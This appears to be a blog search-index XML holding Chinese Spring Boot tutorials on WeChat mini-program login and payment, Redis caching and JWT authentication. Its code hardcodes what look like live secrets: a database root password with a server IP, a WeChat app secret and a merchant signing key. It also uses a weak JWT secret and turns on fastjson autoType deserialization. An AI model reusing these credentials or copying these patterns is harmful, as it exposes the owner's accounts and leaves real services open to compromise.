&lt;target&gt;1.8&lt;/target&gt; &lt;compilerArguments&gt; &lt;bootclasspath&gt;$&#123;java.home&#125;/lib/rt.jar;$&#123;java.home&#125;/lib/jce.jar&lt;/bootclasspath&gt; &lt;/compilerArguments&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-surefire-plugin&lt;/artifactId&gt; &lt;version&gt;2.4.2&lt;/version&gt; &lt;configuration&gt; &lt;skipTests&gt;true&lt;/skipTests&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; &lt;developers&gt; &lt;developer&gt; &lt;name&gt;wxpay&lt;/name&gt; &lt;email&gt;&lt;/email&gt; &lt;url&gt;https://pay.weixin.qq.com/wiki/doc/api/wxa/wxa_api.php?chapter=11_1&lt;/url&gt; &lt;/developer&gt; &lt;/developers&gt; &lt;profiles&gt; &lt;profile&gt; &lt;id&gt;release&lt;/id&gt; &lt;distributionManagement&gt; &lt;snapshotRepository&gt; &lt;id&gt;oss&lt;/id&gt; &lt;url&gt;https://oss.sonatype.org/content/repositories/snapshots/&lt;/url&gt; &lt;/snapshotRepository&gt; &lt;repository&gt; &lt;id&gt;oss&lt;/id&gt; &lt;url&gt;https://oss.sonatype.org/service/local/staging/deploy/maven2/&lt;/url&gt; &lt;/repository&gt; &lt;/distributionManagement&gt; &lt;build&gt; &lt;plugins&gt; &lt;/plugins&gt; &lt;/build&gt; &lt;/profile&gt; &lt;/profiles&gt;&lt;/project&gt; 地表最强yml12345678910111213141516171819202122232425262728293031323334353637383940414243spring: datasource: username: root password: obox11.. url: jdbc:mysql://118.31.120.92:3306/obox driver-class-name: com.mysql.jdbc.Driver type: com.alibaba.druid.pool.DruidDataSource http: encoding: charset: UTF-8 cache: type: redis redis: host: 118.31.120.92 port: 6379 database: 0 timeout: 60s jedis: pool: max-active: -1 max-idle: 50 max-wait: -1sinitialSize: 5minIdle: 5maxActive: 20maxWait: 60000timeBetweenEvictionRunsMillis: 60000minEvictableIdleTimeMillis: 300000validationQuery: SELECT 1 FROM DUALtestWhileIdle: truetestOnBorrow: falsetestOnReturn: falsepoolPreparedStatements: trueserver: port: 8080]]></content>
  </entry>
  <entry>
    <title><![CDATA[springboot 整合 微信小程序]]></title>
    <url>%2F2019%2F08%2F07%2Fspringboot%E6%95%B4%E5%90%88%E5%BE%AE%E4%BF%A1%2F</url>
    <content type="text"><![CDATA[针对各种窒息的微信操蛋接口 微信基本配置微信支付API DEMO 下载链接 ： https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=11_1 微信EncryptedData解密 EncryptedData Model 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586package com.obox.obox.model.WxLogin;public class EncryptedData &#123; private String avatarUrl ; private String openId ; private String nickName ; private String gender ; private String city ; private String province ; private String country ; private String unionId ; private Watermark watermark ; public String getAvatarUrl() &#123; return avatarUrl; &#125; public void setAvatarUrl(String avatarUrl) &#123; this.avatarUrl = avatarUrl; &#125; public String getOpenId() &#123; return openId; &#125; public void setOpenId(String openId) &#123; this.openId = openId; &#125; public String getNickName() &#123; return nickName; &#125; public void setNickName(String nickName) &#123; this.nickName = nickName; &#125; public String getGender() &#123; return gender; &#125; public void setGender(String gender) &#123; this.gender = gender; &#125; public String getCity() &#123; return city; &#125; public void setCity(String city) &#123; this.city = city; &#125; public String getProvince() &#123; return province; &#125; public void setProvince(String province) &#123; this.province = province; &#125; public String getCountry() &#123; return country; &#125; public void setCountry(String country) &#123; this.country = country; &#125; public String getUnionId() &#123; return unionId; &#125; public void setUnionId(String unionId) &#123; this.unionId = unionId; &#125; public Watermark getWatermark() &#123; return watermark; &#125; public void setWatermark(Watermark watermark) &#123; this.watermark = watermark; &#125;&#125; Encrycode Model 1234567891011121314151617181920212223242526272829303132package com.obox.obox.model.WxLogin;public class Encrycode &#123; private String session_key ; private String encrypted_data ; private String iv ; public String getSession_key() &#123; return session_key; &#125; public void setSession_key(String session_key) &#123; this.session_key = session_key; &#125; public String getEncrypted_data() &#123; return encrypted_data; &#125; public void setEncrypted_data(String encrypted_data) &#123; this.encrypted_data = encrypted_data; &#125; public String getIv() &#123; return iv; &#125; public void setIv(String iv) &#123; this.iv = iv; &#125;&#125; EncryptedData解密 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596package com.obox.obox.Utils;import com.alibaba.fastjson.JSONObject;import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;import org.bouncycastle.jce.provider.BouncyCastleProvider;import javax.crypto.Cipher;import javax.crypto.spec.IvParameterSpec;import javax.crypto.spec.SecretKeySpec;import java.security.AlgorithmParameters;import java.security.Security;import java.util.Arrays;public class WxUtils &#123; public static JSONObject getUserInfo(String encryptedData, String sessionKey, String iv)&#123; // 被加密的数据 byte[] dataByte = Base64.decode(encryptedData); // 加密秘钥 byte[] keyByte = Base64.decode(sessionKey); // 偏移量 byte[] ivByte = Base64.decode(iv); try &#123; // 如果密钥不足16位，那么就补足. 这个if 中的内容很重要 int base = 16; if (keyByte.length % base != 0) &#123; int groups = keyByte.length / base + (keyByte.length % base != 0 ? 1 : 0); byte[] temp = new byte[groups * base]; Arrays.fill(temp, (byte) 0); System.arraycopy(keyByte, 0, temp, 0, keyByte.length); keyByte = temp; &#125; // 初始化 Security.addProvider(new BouncyCastleProvider()); Cipher cipher = Cipher.getInstance("AES/CBC/PKCS7Padding","BC"); SecretKeySpec spec = new SecretKeySpec(keyByte, "AES"); AlgorithmParameters parameters = AlgorithmParameters.getInstance("AES"); parameters.init(new IvParameterSpec(ivByte)); cipher.init(Cipher.DECRYPT_MODE, spec, parameters);// 初始化 byte[] resultByte = cipher.doFinal(dataByte); if (null != resultByte &amp;&amp; resultByte.length &gt; 0) &#123; String result = new String(resultByte, "UTF-8"); return JSONObject.parseObject(result); &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return null; &#125;&#125; 微信登陆123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128package com.obox.obox.controller.WeChat.WxApp;import com.alibaba.fastjson.JSONObject;import com.obox.obox.Utils.IdUtil;import com.obox.obox.Utils.JwtUtils;import com.obox.obox.Utils.WxUtils;import com.obox.obox.mapper.InsertMapper.UserInsert;import com.obox.obox.mapper.WxToolMapper;import com.obox.obox.mapper.selectMapper.UserSelect;import com.obox.obox.model.WxLogin.AccessToken;import com.obox.obox.model.WxLogin.Encrycode;import com.obox.obox.model.WxLogin.EncryptedData;import com.obox.obox.model.token.NoToken;import com.obox.obox.model.wechat.UO;import com.obox.obox.model.wechat.UserInfo;import com.sun.org.apache.xml.internal.security.exceptions.Base64DecodingException;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.web.bind.annotation.*;import org.springframework.web.client.RestTemplate;import javax.jws.soap.SOAPBinding;import java.util.HashMap;import java.util.Map;@RestController@RequestMapping("login")public class LoginController &#123; @Autowired private RestTemplate restTemplate ; @Autowired private WxToolMapper wxToolMapper ; @Autowired private UserInsert userInsert ; @Autowired private UserSelect userSelect ; @NoToken @GetMapping("getlogin") public Object Login(@RequestParam(value = "data",required = true) String data)&#123; //WxLoginParams wxLoginParams = JSONObject.parseObject(data,WxLoginParams.class) ; //WxLoginParams params = new WxLoginParams() ; //params.setJs_code(data); Map&lt;String,String&gt; p = new HashMap&lt;&gt;() ; p.put("appid","wxfd4904504d50f9c2") ; p.put("secret","1dcfdc0d47acda452a66a834f730340a") ; p.put("js_code",data) ; p.put("grant_type","authorization_code") ; String url = "https://api.weixin.qq.com/sns/jscode2session?appid=wxfd4904504d50f9c2&amp;secret=1dcfdc0d47acda452a66a834f730340a&amp;js_code="+data+"&amp;grant_type=authorization_code" ; String json = restTemplate.getForObject(url,String.class) ; return json ; &#125; @NoToken @PostMapping("/token") public Object Token(@RequestBody String data) throws Base64DecodingException &#123; // 返回信息 Map&lt;String,Object&gt; d = new HashMap&lt;&gt;() ; Encrycode encrycode = JSONObject.parseObject(data,Encrycode.class) ; String s = "https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&amp;appid=wxfd4904504d50f9c2&amp;secret=1dcfdc0d47acda452a66a834f730340a"; // 获取token String token = restTemplate.getForObject(s,String.class) ; d.put("token",JSONObject.parseObject(token, AccessToken.class)) ; //data.put("code", WxUtils.decryptData(encrypte_data,session_key,iv)); // 解密encrypted d.put("code",WxUtils.getUserInfo(encrycode.getEncrypted_data(),encrycode.getSession_key(),encrycode.getIv())); // 取openid EncryptedData encryptedData = JSONObject.parseObject(JSONObject.toJSONString(WxUtils.getUserInfo(encrycode.getEncrypted_data(),encrycode.getSession_key(),encrycode.getIv())),EncryptedData.class) ; // 根据openid查找uid UO uo = new UO() ; uo.setOpenid(encryptedData.getOpenId()); if (wxToolMapper.SelectUOByOpenid(uo.getOpenid()) == null)&#123; // 表中无用户信息,插入用户信息 // uo表中插入 uo.setUid(IdUtil.Uid()); wxToolMapper.InsertUO(uo) ; // 插入用户初始化信息 UserInfo userInfo = new UserInfo() ; userInfo.setUid(uo.getUid()); userInfo.setUsex(encryptedData.getGender()); userInfo.setUicon(encryptedData.getAvatarUrl()); userInfo.setUname(encryptedData.getNickName()); userInfo.setOpenid(encryptedData.getOpenId()); userInsert.InserUserInfo(userInfo) ; d.put("user",userInfo) ; &#125;else &#123; // 如果表中已经含有用户信息，则直接查找 UO u = wxToolMapper.SelectUOByOpenid(uo.getOpenid()) ; String uid = u.getUid() ; UserInfo userInfo = userSelect.SelectUserInfoByUid(uid) ; d.put("user",userInfo) ; &#125; // 生成用户token String jwtuid = uo.getUid() ; Map&lt;String,Object&gt; jwt = new HashMap&lt;&gt;() ; jwt.put("wxdata",encryptedData) ; jwt.put("uid",jwtuid) ; String payload = JSONObject.toJSONString(jwt) ; d.put("token", JwtUtils.geneJsonWebToken(payload)); return d ; &#125;&#125; 微信支付统一下单接口123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278package com.obox.obox.controller.WeChat.WxPay;import com.alibaba.fastjson.JSONArray;import com.alibaba.fastjson.JSONObject;import com.fasterxml.jackson.databind.ser.Serializers;import com.obox.obox.Utils.IdUtil;import com.obox.obox.Utils.JwtUtils;import com.obox.obox.mapper.BOMapper;import com.obox.obox.mapper.BusinessMapper;import com.obox.obox.mapper.InsertMapper.BaseOrderListInsert;import com.obox.obox.mapper.QRMapper;import com.obox.obox.mapper.selectMapper.BaseOrderListSelect;import com.obox.obox.model.WxLogin.EncryptedData;import com.obox.obox.model.WxPay.BO;import com.obox.obox.model.WxPay.WxOrderGoodsInfo;import com.obox.obox.model.WxPay.WxOrderList;import com.obox.obox.model.token.NoToken;import com.obox.obox.model.wechat.BaseOrderList;import com.obox.obox.model.wechat.CheckSales;import com.obox.obox.service.QR.QRService;import com.obox.obox.service.wxpay.WxPaySDK.WXPayConstants;import com.obox.obox.service.wxpay.WxPaySDK.WXPayUtil;import com.sun.istack.internal.FinalArrayList;import io.jsonwebtoken.Claims;import io.netty.handler.codec.json.JsonObjectDecoder;import org.apache.commons.lang3.StringUtils;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.http.converter.StringHttpMessageConverter;import org.springframework.web.bind.annotation.*;import org.springframework.web.client.RestTemplate;import javax.servlet.http.HttpServletRequest;import java.nio.charset.StandardCharsets;import java.sql.Struct;import java.text.SimpleDateFormat;import java.util.*;/** * * 微信小程序支付 */@RestController@RequestMapping("/wxpay")public class WxPayController &#123; @Autowired private RestTemplate restTemplate ; @Autowired private BaseOrderListInsert baseOrderListInsert ; @Autowired private BaseOrderListSelect baseOrderListSelect ; @Autowired private BusinessMapper businessMapper ; @Autowired private QRMapper qrMapper ; @Autowired private BOMapper boMapper ; /** * 订单下单 * @param data * @param request * @return * @throws Exception */ @PostMapping("/sendwxpay") public Object RequestWxPayAPI(@RequestBody String data, HttpServletRequest request) throws Exception &#123; /** * Token获取 */ String token = request.getHeader("Authorization"); if (StringUtils.isBlank(token)) &#123; token = request.getParameter("Authorization"); &#125; String jwtJson = JwtUtils.decipheringToken(token) ; Map&lt;String ,Object&gt; jwtdata = JSONObject.parseObject(jwtJson,Map.class) ; EncryptedData encryptedData = JSONObject.parseObject(JSONObject.toJSONString(jwtdata.get("wxdata")),EncryptedData.class) ; String openid = encryptedData.getOpenId() ; /** * 初始化请求数据 */ WxOrderList wxOrderList = JSONObject.parseObject(data,WxOrderList.class) ; /** * 初始化订单ID */ final String olid = IdUtil.Olid() ; /** * 请求微信api接口 */ //String body = JSONObject.toJSONString(baseOrderList) ; String url = "https://api.mch.weixin.qq.com/pay/unifiedorder" ; /** * 请求参数初始化 */ Map&lt;String,String&gt; WxPayParams = new HashMap&lt;&gt;() ; WxPayParams.put("appid" , "wxfd4904504d50f9c2") ; WxPayParams.put("mch_id","1545831661") ; WxPayParams.put("nonce_str", WXPayUtil.generateNonceStr()); WxPayParams.put("body","OBOX小程序订单支付") ; WxPayParams.put("out_trade_no",olid) ; WxPayParams.put("total_fee",String.valueOf(wxOrderList.getSum())); WxPayParams.put("spbill_create_ip","118.31.120.92") ; WxPayParams.put("notify_url","http://118.31.120.92/msg") ; WxPayParams.put("trade_type","JSAPI") ; WxPayParams.put("openid",openid) ; WxPayParams.put("sign",WXPayUtil.generateSignature(WxPayParams,"x5pgk5c1TT8h96R489trD52dokUDPYW7")); String XML = WXPayUtil.mapToXml(WxPayParams) ; String r = new String(XML.getBytes(),"UTF-8"); // 请求数据编码配置 restTemplate.getMessageConverters().set(1,new StringHttpMessageConverter(StandardCharsets.UTF_8)) ; String res = restTemplate.postForObject(url,r,String.class) ; /** * 将获得的内容转化为map类型 */ Map&lt;String,String&gt; reponse = WXPayUtil.xmlToMap(res) ; reponse.put("timeStamp",String.valueOf(new Date().getTime()/1000)) ; reponse.put("signType","MD5") ; Map&lt;String,String&gt; result = new HashMap&lt;&gt;() ; result.put("appId",WxPayParams.get("appid")) ; result.put("nonceStr",reponse.get("nonce_str")) ; result.put("package","prepay_id="+reponse.get("prepay_id")) ; result.put("signType","MD5") ; result.put("timeStamp",String.valueOf(new Date().getTime()/1000)) ; String paysign = WXPayUtil.generateSignature(result,"x5pgk5c1TT8h96R489trD52dokUDPYW7") ; String inner = "" ; for (String key : result.keySet())&#123; inner += key + "=" + result.get(key)+"&amp;" ; &#125; inner = inner.substring(0,inner.length()-1) ; inner = "MD5(" + inner + ")" + "=" + paysign ; result.put("paySign",paysign) ; result.remove("appId") ; result.remove("key") ; /** * 插入订单信息 */ List&lt;BaseOrderList&gt; baseOrderLists = new ArrayList&lt;&gt;() ; /** * 循环遍历 */ for (WxOrderGoodsInfo wxOrderGoodsInfo : wxOrderList.getGoods()) &#123; /** * 初始化订单信息 */ BaseOrderList baseOrderList = new BaseOrderList(); baseOrderList.setOlid(olid); baseOrderList.setOltype("notpaid"); baseOrderList.setUid(qrMapper.SelectUidByOpendi(openid)); baseOrderList.setOlgid(wxOrderGoodsInfo.getGid()); baseOrderList.setOlgnum(wxOrderGoodsInfo.getGnum()); baseOrderList.setOlprice(wxOrderGoodsInfo.getGsum()); baseOrderList.setOlremark(wxOrderGoodsInfo.getRemarks()); baseOrderList.setOluphone(wxOrderList.getUphone()); Calendar calendar = Calendar.getInstance(); Date date = calendar.getTime(); SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss"); String s = sdf.format(date); baseOrderList.setOldate(s); // 插入 baseOrderLists.add(baseOrderList); /** * 插入订单 */ baseOrderListInsert.InsertBaseOrderList(baseOrderList); &#125; Map&lt;String,Object&gt; resdata = new HashMap&lt;&gt;() ; resdata.put("reponse",result) ; resdata.put("olid",olid) ; return resdata ; &#125; /** * 确认订单 * @param data 扫码后获得的qrid * @return */ @PostMapping("checkwxpay") public Object CheckPay(@RequestBody String data)&#123; /** * 初始化订单信息 */ List&lt;BaseOrderList&gt; baseOrderLists = baseOrderListSelect.SelectBaseOrderList(data); /** * 更新订单信息 */ baseOrderListInsert.UpdateBaseOrderList(data) ; /** * 二维码 */ List&lt;CheckSales&gt; checkSales = new ArrayList&lt;&gt;() ; /** * 循环遍历 */ for (BaseOrderList b : baseOrderLists) &#123; /** * 初始化订单信息 */ BaseOrderList baseOrderList = b ; /** * 插入BO信息 */ BO bo = new BO(); bo.setOlid(baseOrderList.getOlid()); bo.setGid(baseOrderList.getOlgid()); bo.setGnum(baseOrderList.getOlgnum()); bo.setGprice(baseOrderList.getOlprice()); bo.setGtime(baseOrderList.getOldate()); bo.setBid(businessMapper.SelectBidByGid(baseOrderList.getOlgid())); bo.setUid(baseOrderList.getUid()); // 插入 boMapper.InsertBO(bo) ; /** * 二维码生成 */ for (int i = 0 ;i &lt;bo.getGnum() ; i++)&#123; CheckSales cs = new CheckSales() ; cs.setGid(bo.getGid()); cs.setOlid(bo.getOlid()); cs.setQrid(IdUtil.Qrid()); cs.setStatus("0"); cs.setUid(baseOrderList.getUid()); cs.setQrhref(QRService.GenerateQR(cs.getQrid())); checkSales.add(cs) ; //插入 qrMapper.InsertQR(cs) ; &#125; &#125; return checkSales ; &#125;&#125; 订单二维码生成器12345678910111213141516171819202122232425262728package com.obox.obox.service.QR;import com.alibaba.fastjson.JSON;/** * * 二维码生成服务 */public class QRService &#123; private static String URL = "http://qr.liantu.com/api.php?text=" ; /** * 二维码图片链接 * @param id * @return */ public static String GenerateQR(String id)&#123; String OR_Code_Url = URL + id ; return OR_Code_Url ; &#125;&#125;]]></content>
  </entry>
  <entry>
    <title><![CDATA[SpringBoot整合redis]]></title>
    <url>%2F2019%2F08%2F07%2Fspringboot%E6%95%B4%E5%90%88redis%2F</url>
    <content type="text"><![CDATA[项目中整合redis配置 springboot整合redis缓存maven依赖1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;&lt;/dependency&gt; redis序列换用fastjson 设置fastjson序列化 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657package com.obox.obox.configuration;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.ParserConfig;import com.alibaba.fastjson.serializer.SerializerFeature;import com.fasterxml.jackson.databind.JavaType;import com.fasterxml.jackson.databind.ObjectMapper;import com.fasterxml.jackson.databind.type.TypeFactory;import org.springframework.data.redis.serializer.RedisSerializer;import org.springframework.data.redis.serializer.SerializationException;import org.springframework.util.Assert;import java.nio.charset.Charset;public class FastJsonRedisSerializer&lt;T&gt; implements RedisSerializer &#123; public static final Charset DEFAULT_CHARSET = Charset.forName("UTF-8"); private ObjectMapper objectMapper = new ObjectMapper(); private Class&lt;T&gt; c ; static &#123; ParserConfig.getGlobalInstance().setAutoTypeSupport(true); &#125; public FastJsonRedisSerializer(Class&lt;T&gt; c)&#123; super(); this.c = c ; &#125; @Override public byte[] serialize(Object o) throws SerializationException &#123; return JSON.toJSONString(o, SerializerFeature.WriteClassName).getBytes(); &#125; @Override public Object deserialize(byte[] bytes) throws SerializationException &#123; if (bytes == null || bytes.length&lt;=0)&#123; return null ; &#125; String str = new String(bytes,DEFAULT_CHARSET); return (T)JSON.parseObject(str,c) ; &#125; public void setObjectMapper(ObjectMapper objectMapper) &#123; Assert.notNull(objectMapper, "'objectMapper' must not be null"); this.objectMapper = objectMapper; &#125; protected JavaType getJavaType(Class&lt;?&gt; clazz) &#123; return TypeFactory.defaultInstance().constructType(clazz); &#125;&#125; redis中注册配置fatsjosn序列化工具 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869package com.obox.obox.configuration;import com.fasterxml.jackson.annotation.JsonAutoDetect;import com.fasterxml.jackson.annotation.PropertyAccessor;import com.fasterxml.jackson.databind.ObjectMapper;import org.springframework.cache.CacheManager;import org.springframework.cache.annotation.CachingConfigurationSelector;import org.springframework.cache.annotation.CachingConfigurerSupport;import org.springframework.cache.annotation.EnableCaching;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.data.redis.RedisConnectionFailureException;import org.springframework.data.redis.cache.RedisCacheConfiguration;import org.springframework.data.redis.cache.RedisCacheManager;import org.springframework.data.redis.connection.RedisConnectionFactory;import org.springframework.data.redis.core.RedisTemplate;import org.springframework.data.redis.serializer.RedisSerializer;import org.springframework.data.redis.serializer.StringRedisSerializer;import java.time.Duration;import java.util.HashMap;import java.util.HashSet;import java.util.Map;import java.util.Set;@Configuration@EnableCachingpublic class RedisConfig extends CachingConfigurerSupport &#123; /*@Bean(name="redisTemplate") public RedisTemplate&lt;String,Object&gt; redisTemplate(RedisConnectionFactory factory)&#123; RedisTemplate&lt;String,Object&gt; template = new RedisTemplate&lt;&gt;() ; // 配置连接工厂 template.setConnectionFactory(factory); FastJsonRedisSerializer serializer = new FastJsonRedisSerializer(Object.class); ObjectMapper mapper = new ObjectMapper() ; mapper.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY) ; mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL); serializer.setObjectMapper(mapper); template.setValueSerializer(serializer); template.setKeySerializer(new StringRedisSerializer()); template.afterPropertiesSet(); return template ; &#125;*/ @Bean public RedisSerializer fastJson2JsonRedisSerializer() &#123; return new FastJsonRedisSerializer(Object.class); &#125; @Bean public RedisTemplate initRedisTemplate(RedisConnectionFactory redisConnectionFactory, RedisSerializer fastJson2JsonRedisSerializer) throws Exception &#123; RedisTemplate redisTemplate = new RedisTemplate(); redisTemplate.setConnectionFactory(redisConnectionFactory); redisTemplate.setValueSerializer(fastJson2JsonRedisSerializer); redisTemplate.setKeySerializer(new StringRedisSerializer()); redisTemplate.afterPropertiesSet(); return redisTemplate; &#125; &#125; redis工具类123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114package com.obox.obox.Utils;import com.fasterxml.jackson.databind.ObjectMapper;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.ComponentScan;import org.springframework.data.redis.core.RedisTemplate;import org.springframework.stereotype.Component;@Componentpublic class RedisUtil &#123; @Autowired private RedisTemplate&lt;String,Object&gt; redisTemplate ; public RedisUtil(RedisTemplate&lt;String,Object&gt; redis)&#123; redisTemplate = redis ; &#125; /** * 是否存在key值 * @param key * @return */ public boolean HasKey(String key)&#123; if (redisTemplate.hasKey(key))&#123; return true ; &#125;else &#123; return false ; &#125; &#125; /** * * 添加缓存 * @param key * @param value * @return */ public boolean AddItem(String key ,Object value)&#123; if (value == null)&#123; return false ; &#125;else &#123; redisTemplate.opsForValue().set(key,value); return true ; &#125; &#125; /** * * 删除缓存 * @param key * @return */ public boolean DelItem(String key)&#123; if (redisTemplate.hasKey(key))&#123; redisTemplate.delete(key) ; return true ; &#125;else &#123; return false ; &#125; &#125; /** * * 更新缓存 * @param key * @param value * @return */ public boolean UpdateItem(String key,Object value)&#123; if (this.DelItem(key) &amp;&amp; this.AddItem(key,value) )&#123; return true ; &#125;else &#123; return false ; &#125; &#125; /** * * 获取缓存 * @param key * @return */ public Object GetItem (String key)&#123; if (this.HasKey(key))&#123; return redisTemplate.opsForValue().get(key) ; &#125;else &#123; return null ; &#125; &#125;&#125;]]></content>
  </entry>
  <entry>
    <title><![CDATA[SpringBoot整合jwt]]></title>
    <url>%2F2019%2F08%2F07%2FSpringboot%E6%95%B4%E5%90%88JWT%2F</url>
    <content type="text"><![CDATA[在商业项目中，后端并非只完成http接口就可以，更要对安全问题进行验证，主流springsecurity,shiro,jwt 整合步骤maven依赖12345&lt;dependency&gt; &lt;groupId&gt;io.jsonwebtoken&lt;/groupId&gt; &lt;artifactId&gt;jjwt&lt;/artifactId&gt; &lt;version&gt;0.9.0&lt;/version&gt;&lt;/dependency&gt; 配置拦截器123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112package com.obox.obox.model.token;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import com.obox.obox.Utils.JwtUtils;import io.jsonwebtoken.Claims;import org.apache.commons.lang3.StringUtils;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.stereotype.Component;import org.springframework.web.method.HandlerMethod;import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;import java.lang.reflect.Method;@Componentpublic class JwtInterceptor extends HandlerInterceptorAdapter &#123; public static final String USER_KEY = "oboxusrid"; @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123; String servletPath = request.getServletPath(); System.out.println("ServletPath: " + servletPath); // 如果不是映射到方法直接通过 if (!(handler instanceof HandlerMethod)) &#123; return true; &#125; HandlerMethod handlerMethod = (HandlerMethod) handler; Method method = handlerMethod.getMethod() ; // 检查是否有passtoken注释，有则跳过认证 if (method.isAnnotationPresent(NoToken.class)) &#123; NoToken passToken = method.getAnnotation(NoToken.class); if (passToken.required()) &#123; return true; &#125; &#125; // 需要验证 String token = getToken(request); if (StringUtils.isBlank(token)) &#123; throw new Exception("失效,请重新登录"); &#125; // 获取签名信息 Claims claims = JwtUtils.checkToken(token); System.out.println("TOKEN: " + claims); // 判断签名是否存在或过期 boolean b = claims == null || claims.isEmpty() || JwtUtils.checkToken(token) == null; if (b) &#123; throw new Exception("失效,请重新登录"); &#125; // 将签名中获取的用户信息放入request中; request.setAttribute(USER_KEY, claims.getSubject()); return true; &#125; /** * 获取请求Token */ private String getToken(HttpServletRequest request) &#123; String token = request.getHeader("Authorization"); if (StringUtils.isBlank(token)) &#123; token = request.getParameter("Authorization"); &#125; return token; &#125; /** * 不用拦截的页面路径(也可存入数据库中), 不要以 / 结尾 */ private static final String[] NOT_CHECK_URL = &#123;"/test/**", "/login/**"&#125;; /** * 根据URL判断当前请求是否不需要校验, true:需要校验 */ public boolean isNotCheck(String servletPath) &#123; // 若 请求接口 以 / 结尾, 则去掉 / servletPath = servletPath.endsWith("/") ? servletPath.substring(0,servletPath.lastIndexOf("/")) : servletPath; System.out.println("servletPath = " + servletPath); for (String path : NOT_CHECK_URL) &#123; System.out.println("path = " + path); // path 以 /** 结尾, servletPath 以 path 前缀开头 if (path.endsWith("/**")) &#123; String pathStart = path.substring(0, path.lastIndexOf("/")+1); System.out.println("pathStart = " + pathStart); if (servletPath.startsWith(pathStart)) &#123; return true; &#125; String pathStart2 = path.substring(0, path.lastIndexOf("/")); System.out.println("pathStart2 = " + pathStart2); if (servletPath.equals(pathStart2)) &#123; return true; &#125; &#125; // servletPath == path if (servletPath.equals(path)) &#123; return true; &#125; &#125; return false; &#125;&#125; 设置无需验证注解123456789101112131415package com.obox.obox.model.token;import java.lang.annotation.ElementType;import java.lang.annotation.Retention;import java.lang.annotation.RetentionPolicy;import java.lang.annotation.Target;/** * 无需token验证注解 */@Target(&#123; ElementType.METHOD, ElementType.TYPE &#125;)@Retention(RetentionPolicy.RUNTIME)public @interface NoToken &#123; boolean required() default true;&#125; 设置拦截器生效1234567891011121314151617181920212223242526package com.obox.obox.configuration;import com.obox.obox.model.token.JwtInterceptor;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.context.annotation.Configuration;import org.springframework.http.converter.HttpMessageConverter;import org.springframework.web.servlet.config.annotation.InterceptorRegistry;import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;import org.springframework.web.servlet.config.annotation.WebMvcConfigurerAdapter;@Configurationpublic class WebConfig implements WebMvcConfigurer &#123; @Autowired private JwtInterceptor jwtInterceptor; /** * APP接口拦截器 */ @Override public void addInterceptors(InterceptorRegistry registry) &#123; registry.addInterceptor(jwtInterceptor).addPathPatterns("/**"); &#125;&#125; 设置JWTUtil12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576package com.obox.obox.Utils;import io.jsonwebtoken.Claims;import io.jsonwebtoken.Jwts;import io.jsonwebtoken.SignatureAlgorithm;import java.util.Date;/** * jwt 工具类 * */public class JwtUtils &#123; public static String SUBJECT = "oboxweb" ; public static final long EXPIRE = 1000*60*60 ; public static final String APPSECRET = "oboxsecret" ; /** * Token 生成 * @param info * @return */ public static String geneJsonWebToken(String info)&#123; if (info != null) &#123; String token = Jwts.builder().setSubject(SUBJECT) .claim("info", info) // 加密信息 .setIssuedAt(new Date()) // 发行时间 .setExpiration(new Date(System.currentTimeMillis() + EXPIRE)) // 过期时间 .signWith(SignatureAlgorithm.HS256, APPSECRET).compact(); // 设置加密算法和加密串 return token ; &#125;else &#123; return null ; &#125; &#125; /** * token 校验 * @param token * @return */ public static Claims checkToken(String token)&#123; try &#123; final Claims claims = Jwts.parser().setSigningKey(APPSECRET).parseClaimsJws(token).getBody() ; return claims ; &#125;catch (Exception e)&#123; return null ; &#125; &#125; /** * token 解密 * @return */ public static String decipheringToken(String token)&#123; try &#123; final Claims claims = Jwts.parser().setSigningKey(APPSECRET).parseClaimsJws(token).getBody() ; return (String) claims.get("info") ; &#125;catch (Exception e)&#123; return null ; &#125; 